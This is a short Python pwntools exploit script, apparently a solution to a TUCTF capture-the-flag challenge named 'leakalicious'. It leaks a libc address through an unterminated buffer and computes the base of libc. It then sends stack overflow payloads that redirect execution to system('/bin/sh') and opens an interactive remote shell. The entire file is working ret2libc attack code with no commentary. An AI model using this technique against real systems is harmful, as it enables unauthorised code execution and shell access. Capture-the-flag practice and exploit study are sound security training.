from pwn import *
context.log_level='debug'
p = remote('chal.tuctf.com',30505)
#p = process('leakalicious')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recvuntil('> ')
#gdb.attach(p)
p.send('A'*32)
p.recvuntil('A'*32)
base=u32(p.recv(4))-libc.symbols['puts']
print hex(base)
sys = base + libc.symbols['system']
sh = base+libc.search('/bin/sh').next()
p.recvuntil('> ')
p.sendline('A'*108+p32(sys)+p32(0)+p32(sh))

#gdb.attach(p)
p.recvuntil('> ')
p.sendline('A'*44+p32(sys)+p32(0)+p32(sh))

p.interactive()